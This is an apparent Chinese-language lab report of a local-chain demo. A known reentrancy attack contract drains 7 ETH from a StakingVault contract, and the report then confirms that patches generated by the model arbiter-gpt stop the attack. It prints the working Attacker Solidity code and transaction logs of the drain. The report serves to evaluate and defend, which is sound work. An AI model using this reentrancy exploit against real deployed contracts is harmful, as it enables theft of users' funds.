# 鏈上 demo 方案 e：StakingVault × DRAIN 攻擊 × arbiter-gpt 修補

- 日期：2026-10-28
- 起點 5e18404；anvil／forge／cast 1.8.6
- **鏈上攻擊不是模型產生的**：它是 `scripts/victim_probe.py` 的 DRAIN Attacker，在 2026-07-28（commit 69354be「Ask who lost, instead of whether the attacker beat a baseline it chose itself」）為了校正 victim_loss 判定而寫的已知攻擊。
- **修補是模型產生的**：arbiter-gpt:latest 對 spark-test-2、3、4 產生、並通過修補閘門的 diff（`runs/spark-test-{2,3,4}.patches.jsonl`）。
- 不發任何 LLM 請求：所有 ledger 檔總行數前 109、後 109。
- agent.py、tools.py、verdict.py、patch.py、workspace.py、live.py、live_replay.py、gate.py、web.py 都沒有改動。
- 原始輸出：`reports/live_attack_stakingvault/`（12 次的 stdout 與 JSON transcript）

## 結論

**方案 e 成立，不需要退回 a。**

| 目標 | A 無攻擊取回 | B 有攻擊取回 | G 攻擊者獲利 | 金庫被掏空 | 判定 | 3 次重跑 |
|---|---|---|---|---|---|---|
| 原合約 examples/StakingVault.sol | 2 ETH | **0 ETH** | **7 ETH** | 7 ETH | **PROVEN** | 數字、交易 hash、gas 完全相同 |
| spark-test-2 修補（arbiter-gpt） | 2 ETH | 2 ETH | 0 | 0 | NOT PROVEN | 完全相同 |
| spark-test-3 修補（arbiter-gpt） | 2 ETH | 2 ETH | 0 | 0 | NOT PROVEN | 完全相同 |
| spark-test-4 修補（arbiter-gpt） | 2 ETH | 2 ETH | 0 | 0 | NOT PROVEN | 完全相同 |

鏈上的 A/B/G＝2/0/7，和合成層裡 DRAIN 在 4 個環境的答案相同（`xval_llm_patches_2026-10-28.md`）；修補後 2/2/0 也和合成層相同。

## 腳本：`scripts/live_attack_stakingvault.py`

- 結構仿照 `scripts/live_attack.py`，只 import `arbiter.live` 的 `LiveChain`、`Step`、`Transcript`、`assert_no_cheatcodes`、`ChainUnavailable`，以及 `arbiter.patch.apply_diff`（套修補用）。
- 目標：直接讀 `examples/StakingVault.sol` 原檔，沒有另寫一份。
- 攻擊合約：DRAIN Attacker 原文寫在腳本裡，啟動時 assert 和 `victim_probe.ATTACKER` 正規化空白後一字不差，並跑 `assert_no_cheatcodes`。
  ```solidity
  contract Attacker {
      StakingVault public v;
      uint256 public hits;
      constructor(address _v) payable { v = StakingVault(payable(_v)); }
      function attack() external { v.stake{value: 1 ether}(); v.unstake(); }
      receive() external payable {
          if (hits < 8 && address(v).balance >= 1 ether) { hits++; v.unstake(); }
      }
  }
  ```
- 帳戶與金額（anvil 預設帳戶 0、1、2）：
  - deployer 部署 StakingVault，建構子帶 **5 ETH**。確認過 spark-test-2 PoC 的 `arbSetup()` 實際是 `target = new StakingVault{value: 5 ether}();`，和 DRAIN 的 `deploy_code` 相同。
  - victim `stake()` **2 ETH**（DRAIN 的 `victim_enter`）。
  - attacker 部署 Attacker，建構子帶 **1 ETH**。DRAIN 規格本身沒有寫攻擊者的資金，合成層是用 `vm.deal` 給 10 ETH；`attack()` 只會 `stake{value: 1 ether}`，所以鏈上給剛好 1 ETH 本金。這是我選的值，記在這裡。
  - attacker 呼叫 `attack()`；victim 呼叫 `unstake()`。
- 對照組：另一條從 genesis 開始的鏈，所有交易相同，只是**不送 `attack()`**（攻擊合約照樣部署）。
- `--patched <run_id>`：用 `patch.apply_diff` 把 `runs/<run_id>.patches.jsonl` 裡 `status=accepted` 的 diff 套到原檔上；攻擊合約、帳戶、金額、交易完全相同。

### 判定規則（和 live_attack.py 相同）
`proven = drained > 0 and attacker_net > 0 and victim_recovered < victim_paid_in`（live_attack.py 的 `t.verdict["proven"]`）
- `drained`：`attack()` 前後金庫餘額的減少（節點讀回）。
- `attacker_net`：攻擊者 EOA＋攻擊合約餘額在 `attack()` 前後的變化（含 gas），同 live_attack.py。
- `victim_recovered`：受害者 `unstake()` 交易前後**金庫餘額的減少**（`unstake()` 只會把錢送給 msg.sender，所以這就是受害者拿回的錢，不受 gas 影響）；交易失敗則為 0。live_attack.py 是「claim 成功就算全額」，這裡改成實測值，規則條件本身沒變。
- 報表另列 A（對照鏈的 victim_recovered）與 G（攻擊合約在 `attack()` 前後的餘額變化）。

## 輸出（第 1 次，原合約）

```
  control chain (chain 31337, http://127.0.0.1:8600)
    ok  deploy StakingVault (5 ETH)    tx=0xc2abd9446c00f8e5af5d5127a85b15e6c3412b31f525ade3355be3fd39c0c313
    ok  stake()                        tx=0xfe07e5bdbae29c340c1ed3893a8049e057ac36651a390b84b11c26c6f1364a1c  gas=48,810
    ok  deploy Attacker (1 ETH)        tx=0x558135e78c50e81437b3f8bed1e933052bb828b23795708184f73636e13edead
    ok  unstake()                      tx=0x22337113b2593ae139790bc71497c7c64ff0cb52ba5bc2caf580a944ac418e47  gas=33,918
    vault 7 ETH -> 7 ETH after attack step -> 5 ETH after victim exit
  attack chain  (chain 31337, http://127.0.0.1:8601)
    ok  deploy StakingVault (5 ETH)    tx=0xc2abd9446c00f8e5af5d5127a85b15e6c3412b31f525ade3355be3fd39c0c313
    ok  stake()                        tx=0xfe07e5bdbae29c340c1ed3893a8049e057ac36651a390b84b11c26c6f1364a1c  gas=48,810
    ok  deploy Attacker (1 ETH)        tx=0x558135e78c50e81437b3f8bed1e933052bb828b23795708184f73636e13edead
    ok  attack()                       tx=0x57d1c672b4c590ea399ab2a8c73ffb845067906fec6682663b61336982a7cd2d  gas=132,142
    REV unstake()                      Error("eth transfer failed")
    vault 7 ETH -> 0 ETH after attack step -> 0 ETH after victim exit

  target: original
  A  victim recovered, control chain          2 ETH
  B  victim recovered, attack chain           0 ETH   (paid in 2 ETH)
  G  attacker contract gain                   7 ETH   (net incl. gas 6.999911 ETH)
     vault drained by the attack step         7 ETH

  PROVEN on a live chain: value left the vault, the attacker holds it,
  and the victim who staked 2 ETH did not get it back.
```
- 攻擊合約先 stake 1 ETH，再重入 `unstake()` 共 8 次，每次拿走 1 ETH，金庫的 8 ETH（deployer 5＋victim 2＋攻擊者 1）全數領出；扣掉自己的 1 ETH 本金，淨賺 7 ETH。受害者的 `unstake()` 因為金庫沒錢而在 `require(ok, "eth transfer failed")` revert。

## 輸出（修補版，以 spark-test-2 為例）

```
  attack chain  (chain 31337, http://127.0.0.1:8601)
    ok  deploy StakingVault (5 ETH)    tx=0xeef6401f55436ca53ae14e3c0b0dbd0e0cf4f0cdcac55644b9437afcc200417d
    ok  stake()                        tx=0xfe07e5bdbae29c340c1ed3893a8049e057ac36651a390b84b11c26c6f1364a1c  gas=48,810
    ok  deploy Attacker (1 ETH)        tx=0xfadf31a26559b19b571a7d6f3d73ff380359db3a5bffaa753beceec8c4436134
    REV attack()                       Error("eth transfer failed")
    ok  unstake()                      tx=0x58b56b8b8f2078cc03ad570e13f10d4b1b5aca62556e5cba8fcfe1548b5037c3  gas=33,918
    vault 7 ETH -> 7 ETH after attack step -> 5 ETH after victim exit

  target: patched (runs/spark-test-2.patches.jsonl, arbiter-gpt:latest, 6 lines)
  A  victim recovered, control chain          2 ETH
  B  victim recovered, attack chain           2 ETH   (paid in 2 ETH)
  G  attacker contract gain                   0 ETH   (net incl. gas 0 ETH)
     vault drained by the attack step         0 ETH

  NOT PROVEN. The transcript above is what actually happened.
```
- 修補後狀態先清零，重入的 `unstake()` 遇到 `require(amount > 0)` → 內層 revert → 外層 `require(ok, "eth transfer failed")` revert → 整筆 `attack()` 回滾（連 stake 的 1 ETH 也退回）。受害者照常取回 2 ETH。
- spark-test-3、4 的修補輸出的判定與 A/B/G 相同；交易 hash 不同：StakingVault 與 Attacker 的部署交易（bytecode 不同；Attacker import 了 StakingVault，編譯 metadata 跟著變），以及 victim 的 `unstake()`（spark-test-3 與 4 這筆相同、和 2 不同，推測是 cast 估出的 gas limit 不同，未查證）。victim 的 `stake()` 在 4 組都是同一個 hash。

## 重複性：12 次執行

| 組 | 次數 | 判定 | A/B/G | attacker_net | 數字相同 | 交易 hash 與 gas 相同 |
|---|---|---|---|---|---|---|
| 原合約 | 3 | PROVEN | 2/0/7 | 6.999911 ETH | ✅ | ✅ |
| spark-test-2 修補 | 3 | NOT PROVEN | 2/2/0 | 0 | ✅ | ✅ |
| spark-test-3 修補 | 3 | NOT PROVEN | 2/2/0 | 0 | ✅ | ✅ |
| spark-test-4 修補 | 3 | NOT PROVEN | 2/2/0 | 0 | ✅ | ✅ |

anvil 每次都從相同的 genesis 與預設帳戶開始，所以交易 hash、gas 每次都一樣，結果是決定性的，可以當作決賽的現場重播。

## 要知道的細節

- 部署交易（`forge create`）的 gas 欄位顯示 0：`LiveChain.deploy()` 只回傳地址與 tx hash，不讀 gas；和 live_attack.py 相同，不影響判定。
- 修補版的 `attack()` 顯示 `REV`、沒有 tx hash：`cast send` 在估算 gas 時就收到 revert，交易沒有送出上鏈，所以攻擊者也沒有花到 gas（attacker_net＝0）。live_attack.py `--patched` 的行為相同。若決賽要在畫面上顯示「一筆上鏈但 revert 的交易 hash」，需要另外處理（例如指定 gas limit 強制送出），這次沒做。
- 鏈上攻擊是人寫的 DRAIN，不是 arbiter-gpt 的 exploit。模型的 exploit 只在 8 輪環境讓受害者受損，而且轉譯上鏈會失敗（`live_replay_stakingvault_2026-10-28.md`）。畫面與答辯都要講清楚：**攻擊是已知的參考攻擊，修補才是模型產生的**。

## 合併前檢查

- 8 個 probe 結束碼全 0；`patch_probe.py` 5/5 as expected；`live_attack.py` PROVEN、`--patched` NOT PROVEN
- agent.py、tools.py、live.py、live_replay.py 與 `innoserve-base` 零差異；verdict.py、patch.py、workspace.py、gate.py、web.py 自 5e18404 起零差異
- LLM ledger 總行數：109 → 109
